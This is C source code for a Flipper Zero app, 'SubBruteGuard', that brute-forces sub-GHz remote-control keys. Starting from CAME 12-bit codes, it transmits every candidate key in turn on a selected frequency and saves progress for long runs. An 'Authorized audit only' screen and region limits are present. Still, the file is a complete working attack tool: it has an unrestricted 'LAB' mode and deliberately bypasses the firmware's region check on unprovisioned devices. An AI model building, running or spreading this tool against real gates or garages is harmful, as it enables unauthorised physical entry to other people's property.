#include <furi.h>
#include <furi_hal_region.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <input/input.h>
#include <lib/flipper_format/flipper_format.h>
#include <lib/subghz/devices/cc1101_int/cc1101_int_interconnect.h>
#include <lib/subghz/devices/devices.h>
#include <lib/subghz/environment.h>
#include <lib/subghz/subghz_protocol_registry.h>
#include <lib/subghz/transmitter.h>
#include <storage/storage.h>

#include "subbruteguard_logic.h"

#define TAG                 "SubBruteGuard"
#define CHECKPOINT_PATH     APP_DATA_PATH("checkpoint.txt")
#define CHECKPOINT_PERIOD   50
#define INTER_CODE_DELAY_MS 40

typedef enum {
    SbgViewIntro,
    SbgViewRegion,
    SbgViewPick,
    SbgViewRunning,
    SbgViewPaused,
    SbgViewBlocked,
} SbgView;

typedef enum {
    SbgEventTypeTick,
    SbgEventTypeInput,
} SbgEventType;

typedef struct {
    SbgEventType type;
    InputEvent input;
} SbgEvent;

typedef struct {
    FuriMutex* mutex;
    FuriMessageQueue* queue;
    FuriTimer* timer;

    SbgView view;
    SbgRegionId region;
    SbgProtocolId protocol;
    uint8_t freq_index;
    uint64_t step;
    uint64_t total_steps;
    bool running;

    Gui* gui;
    ViewPort* view_port;
    Storage* storage;
    const SubGhzDevice* radio_device;
} SbgApp;

/* Persist {protocol, freq_index, step} so a long run survives a battery swap
 * instead of restarting the whole key space. Written every
 * CHECKPOINT_PERIOD codes, not every code: the SD card write is slow enough
 * to visibly stall the TX cadence otherwise. */
static void sbg_checkpoint_save(SbgApp* app) {
    File* file = storage_file_alloc(app->storage);
    if(storage_file_open(file, CHECKPOINT_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        FuriString* line = furi_string_alloc_printf(
            "%u %u %u %llu\n",
            (unsigned)app->region,
            (unsigned)app->protocol,
            (unsigned)app->freq_index,
            (unsigned long long)app->step);
        storage_file_write(file, furi_string_get_cstr(line), furi_string_size(line));
        furi_string_free(line);
    }
    storage_file_close(file);
    storage_file_free(file);
}

static void sbg_checkpoint_load(SbgApp* app) {
    File* file = storage_file_alloc(app->storage);
    if(storage_file_open(file, CHECKPOINT_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[64] = {0};
        uint16_t read = storage_file_read(file, buf, sizeof(buf) - 1);
        if(read > 0) {
            unsigned region = 0, proto = 0, freq = 0;
            unsigned long long step = 0;
            if(sscanf(buf, "%u %u %u %llu", &region, &proto, &freq, &step) == 4 &&
               region < SbgRegionCount && proto < SbgProtoCount) {
                app->region = (SbgRegionId)region;
                app->protocol = (SbgProtocolId)proto;
                const SbgProtocol* p = sbg_protocol(app->protocol);
                app->freq_index = (freq < p->frequency_count) ? (uint8_t)freq : 0;
                app->total_steps = sbg_total_steps(app->protocol);
                app->step = (step < app->total_steps) ? step : 0;
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
}

/* Three independent checks, not one: furi_hal_subghz_is_frequency_valid is
 * the hardware's physical tuning range, always required. sbg_region_allows
 * is the user's own explicit jurisdiction choice (see subbruteguard_logic.h
 * for why this exists instead of relying on furi_hal_region alone: it has
 * no Indonesia entry, and this app has shipped on hardware observed to have
 * no region provisioned at all, which fails every frequency unconditionally
 * even ones every real preset allows). furi_hal_region_is_frequency_allowed
 * is only consulted when the hardware actually has a provisioned region, as
 * an extra belt on top of the user's choice, not instead of it — an
 * unprovisioned "--" state must not be allowed to silently defeat an
 * app that exists specifically to let the user make this choice explicitly. */
static bool sbg_frequency_allowed(SbgRegionId region, uint32_t freq) {
    if(!furi_hal_subghz_is_frequency_valid(freq)) return false;
    if(!sbg_region_allows(region, freq)) return false;
    if(furi_hal_region_is_provisioned() && !furi_hal_region_is_frequency_allowed(freq)) {
        return false;
    }
    return true;
}

static bool
    sbg_send_one_code(SbgApp* app, SbgRegionId region, uint32_t freq, const SbgProtocol* proto) {
    if(!sbg_frequency_allowed(region, freq)) return false;

    char key_hex[32];
    sbg_candidate_hex(app->protocol, app->step, key_hex, sizeof(key_hex));
    uint8_t key_bytes[SBG_CANDIDATE_BYTES];
    sbg_candidate_bytes(app->protocol, app->step, key_bytes);

    FlipperFormat* ff = flipper_format_string_alloc();
    flipper_format_write_header_cstr(ff, "Flipper SubGhz Key File", 1);
    flipper_format_write_uint32(ff, "Frequency", &freq, 1);
    flipper_format_write_string_cstr(ff, "Preset", "FuriHalSubGhzPresetOok650Async");
    flipper_format_write_string_cstr(ff, "Protocol", proto->sub_protocol);
    int32_t bits = proto->bits;
    flipper_format_write_int32(ff, "Bit", &bits, 1);
    flipper_format_write_hex(ff, "Key", key_bytes, SBG_CANDIDATE_BYTES);
    if(proto->te_us) {
        uint32_t te = proto->te_us;
        flipper_format_write_uint32(ff, "TE", &te, 1);
    }
    uint32_t repeat = proto->repeat;
    flipper_format_write_uint32(ff, "Repeat", &repeat, 1);
    flipper_format_rewind(ff);

    /* subghz_environment_set_protocol_registry is not optional: without it
     * the environment has no protocol table to resolve proto->sub_protocol
     * against. An earlier version of this function skipped it, and the
     * resulting transmitter crashed the device with "furi_check failed" on
     * real hardware the first time an armed run actually transmitted - not
     * a theory, confirmed by reproducing and fixing it. This sequence
     * (environment -> registry -> transmitter -> deserialize, then
     * subghz_devices_* for the radio, never furi_hal_subghz_* directly) is
     * copied from official firmware's own "subghz tx" CLI command
     * (applications/main/subghz/subghz_cli.c), the one place in the
     * firmware source that builds and sends a key file exactly like this
     * app does. Do not "simplify" this back to raw furi_hal_subghz_* calls. */
    SubGhzEnvironment* env = subghz_environment_alloc();
    subghz_environment_set_protocol_registry(env, &subghz_protocol_registry);
    SubGhzTransmitter* tx = subghz_transmitter_alloc_init(env, proto->sub_protocol);
    bool ok = tx != NULL && subghz_transmitter_deserialize(tx, ff) == SubGhzProtocolStatusOk;

    if(ok) {
        subghz_devices_begin(app->radio_device);
        subghz_devices_reset(app->radio_device);
        subghz_devices_load_preset(app->radio_device, FuriHalSubGhzPresetOok650Async, NULL);
        subghz_devices_set_frequency(app->radio_device, freq);

        ok = subghz_devices_start_async_tx(app->radio_device, subghz_transmitter_yield, tx);
        if(ok) {
            while(!subghz_devices_is_async_complete_tx(app->radio_device)) {
                furi_delay_ms(1);
            }
            subghz_devices_stop_async_tx(app->radio_device);
        }
        subghz_devices_idle(app->radio_device);
        subghz_devices_end(app->radio_device);
    }

    if(tx) subghz_transmitter_free(tx);
    subghz_environment_free(env);
    flipper_format_free(ff);

    FURI_LOG_D(TAG, "step %llu key %s ok=%d", (unsigned long long)app->step, key_hex, ok);
    return ok;
}

static const char* sbg_region_badge(SbgRegionId id);

static void sbg_draw_callback(Canvas* canvas, void* ctx) {
    SbgApp* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(app->view == SbgViewIntro) {
        canvas_draw_str(canvas, 2, 10, "SubBruteGuard");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 22, "Authorized audit only.");
        canvas_draw_str(canvas, 2, 32, "Up/Down: pick protocol");
        canvas_draw_str(canvas, 2, 42, "Left/Right: pick freq");
        canvas_draw_str(canvas, 2, 52, "Hold OK: arm and run");
        canvas_draw_str(canvas, 2, 61, "Press any key...");
        furi_mutex_release(app->mutex);
        return;
    }

    if(app->view == SbgViewRegion) {
        const SbgRegion* r = sbg_region(app->region);
        canvas_draw_str(canvas, 2, 10, "SubBruteGuard");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 22, "Pick your jurisdiction:");
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 2, 36, r->label);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 48, "Up/Down: change");
        canvas_draw_str(canvas, 2, 61, "OK: confirm  Back: exit");
        furi_mutex_release(app->mutex);
        return;
    }

    const SbgProtocol* p = sbg_protocol(app->protocol);
    canvas_draw_str(canvas, 2, 10, "SubBruteGuard");
    canvas_draw_str(canvas, 100, 10, sbg_region_badge(app->region));
    canvas_set_font(canvas, FontSecondary);

    char freq_line[32];
    snprintf(
        freq_line,
        sizeof(freq_line),
        "%s %lu.%02lu MHz",
        p->label,
        p->frequencies_hz[app->freq_index] / 1000000,
        (p->frequencies_hz[app->freq_index] / 10000) % 100);
    canvas_draw_str(canvas, 2, 22, freq_line);

    if(app->view == SbgViewBlocked) {
        canvas_draw_str(canvas, 2, 32, "Region blocks this freq");
        canvas_draw_str(canvas, 2, 42, "Pick another, Back exits");
    } else if(app->view == SbgViewPaused) {
        char progress[32];
        sbg_format_progress(app->step, app->total_steps, progress, sizeof(progress));
        canvas_draw_str(canvas, 2, 32, "Paused");
        canvas_draw_str(canvas, 2, 42, progress);
        canvas_draw_str(canvas, 2, 52, "OK: resume  Hold OK: new");
    } else if(app->view == SbgViewRunning) {
        char progress[32];
        sbg_format_progress(app->step, app->total_steps, progress, sizeof(progress));
        canvas_draw_str(canvas, 2, 32, "Running");
        canvas_draw_str(canvas, 2, 42, progress);
        canvas_draw_str(canvas, 2, 52, "Back: pause");
    } else {
        canvas_draw_str(canvas, 2, 32, "Up/Down: protocol");
        canvas_draw_str(canvas, 2, 42, "Left/Right: frequency");
        canvas_draw_str(canvas, 2, 52, "Hold OK: arm and run");
    }

    furi_mutex_release(app->mutex);
}

static void sbg_input_callback(InputEvent* input, void* ctx) {
    SbgApp* app = ctx;
    SbgEvent event = {.type = SbgEventTypeInput, .input = *input};
    furi_message_queue_put(app->queue, &event, 0);
}

static void sbg_timer_callback(void* ctx) {
    SbgApp* app = ctx;
    SbgEvent event = {.type = SbgEventTypeTick};
    furi_message_queue_put(app->queue, &event, 0);
}

/* Short badge drawn next to the title so the active jurisdiction is always
 * visible, not just on the one-time region-picker screen. */
static const char* sbg_region_badge(SbgRegionId id) {
    switch(id) {
    case SbgRegionUnrestricted:
        return "LAB";
    case SbgRegionEu:
        return "EU";
    case SbgRegionUsCaAu:
        return "US";
    case SbgRegionJp:
        return "JP";
    case SbgRegionIndonesia:
        return "ID";
    default:
        return "";
    }
}

static void sbg_advance_region(SbgApp* app, int delta) {
    int next = ((int)app->region + delta + SbgRegionCount) % SbgRegionCount;
    app->region = (SbgRegionId)next;
}

static void sbg_advance_protocol(SbgApp* app, int delta) {
    int next = ((int)app->protocol + delta + SbgProtoCount) % SbgProtoCount;
    app->protocol = (SbgProtocolId)next;
    app->freq_index = 0;
    app->step = 0;
    app->total_steps = sbg_total_steps(app->protocol);
}

static void sbg_advance_frequency(SbgApp* app, int delta) {
    const SbgProtocol* p = sbg_protocol(app->protocol);
    int next = ((int)app->freq_index + delta + p->frequency_count) % p->frequency_count;
    app->freq_index = (uint8_t)next;
}

int32_t subbruteguard_app(void* p) {
    UNUSED(p);
    SbgApp* app = malloc(sizeof(SbgApp));
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->queue = furi_message_queue_alloc(8, sizeof(SbgEvent));
    app->view = SbgViewIntro;
    app->region = SbgRegionIndonesia;
    app->protocol = SbgProtoCame12;
    app->freq_index = 0;
    app->step = 0;
    app->total_steps = sbg_total_steps(app->protocol);
    app->running = false;
    app->storage = furi_record_open(RECORD_STORAGE);

    subghz_devices_init();
    app->radio_device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);

    sbg_checkpoint_load(app);

    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, sbg_draw_callback, app);
    view_port_input_callback_set(app->view_port, sbg_input_callback, app);

    app->gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    app->timer = furi_timer_alloc(sbg_timer_callback, FuriTimerTypePeriodic, app);
    furi_timer_start(app->timer, furi_ms_to_ticks(100));

    bool exit_requested = false;
    while(!exit_requested) {
        SbgEvent event;
        if(furi_message_queue_get(app->queue, &event, FuriWaitForever) != FuriStatusOk) continue;

        furi_mutex_acquire(app->mutex, FuriWaitForever);

        if(event.type == SbgEventTypeTick) {
            if(app->view == SbgViewRunning) {
                const SbgProtocol* proto = sbg_protocol(app->protocol);
                uint32_t freq = proto->frequencies_hz[app->freq_index];
                furi_mutex_release(app->mutex);

                bool sent = sbg_send_one_code(app, app->region, freq, proto);

                furi_mutex_acquire(app->mutex, FuriWaitForever);
                if(!sent) {
                    app->view = SbgViewBlocked;
                } else {
                    app->step++;
                    if(app->step % CHECKPOINT_PERIOD == 0) sbg_checkpoint_save(app);
                    if(app->step >= app->total_steps) {
                        app->view = SbgViewPaused; /* key space exhausted */
                    }
                }
            }
        } else if(event.type == SbgEventTypeInput) {
            InputEvent* in = &event.input;

            if(app->view == SbgViewIntro) {
                if(in->type == InputTypeRelease) app->view = SbgViewRegion;
            } else if(in->type == InputTypeShort) {
                switch(in->key) {
                case InputKeyUp:
                    if(app->view == SbgViewRegion) {
                        sbg_advance_region(app, 1);
                    } else if(app->view == SbgViewPick || app->view == SbgViewBlocked) {
                        sbg_advance_protocol(app, 1);
                        app->view = SbgViewPick;
                    }
                    break;
                case InputKeyDown:
                    if(app->view == SbgViewRegion) {
                        sbg_advance_region(app, -1);
                    } else if(app->view == SbgViewPick || app->view == SbgViewBlocked) {
                        sbg_advance_protocol(app, -1);
                        app->view = SbgViewPick;
                    }
                    break;
                case InputKeyRight:
                    if(app->view == SbgViewPick || app->view == SbgViewBlocked) {
                        sbg_advance_frequency(app, 1);
                        app->view = SbgViewPick;
                    }
                    break;
                case InputKeyLeft:
                    if(app->view == SbgViewPick || app->view == SbgViewBlocked) {
                        sbg_advance_frequency(app, -1);
                        app->view = SbgViewPick;
                    }
                    break;
                case InputKeyOk:
                    if(app->view == SbgViewRegion) {
                        app->view = SbgViewPick;
                    } else if(app->view == SbgViewPaused) {
                        app->view = SbgViewRunning;
                    }
                    break;
                case InputKeyBack:
                    if(app->view == SbgViewRunning) {
                        app->view = SbgViewPaused;
                        sbg_checkpoint_save(app);
                    } else if(
                        app->view == SbgViewPick || app->view == SbgViewBlocked ||
                        app->view == SbgViewRegion) {
                        exit_requested = true;
                    } else if(app->view == SbgViewPaused) {
                        exit_requested = true;
                    }
                    break;
                default:
                    break;
                }
            } else if(in->type == InputTypeLong) {
                if(in->key == InputKeyOk &&
                   (app->view == SbgViewPick || app->view == SbgViewPaused)) {
                    /* Arm gesture: a long press, distinct from the short
                     * presses used to browse protocol/frequency, so a
                     * transmit never starts from an accidental tap. */
                    app->step = 0;
                    app->view = SbgViewRunning;
                } else if(in->key == InputKeyBack) {
                    exit_requested = true;
                }
            }
        }

        furi_mutex_release(app->mutex);
    }

    sbg_checkpoint_save(app);

    furi_timer_stop(app->timer);
    furi_timer_free(app->timer);

    gui_remove_view_port(app->gui, app->view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(app->view_port);

    subghz_devices_deinit();
    furi_record_close(RECORD_STORAGE);
    furi_message_queue_free(app->queue);
    furi_mutex_free(app->mutex);
    free(app);

    return 0;
}
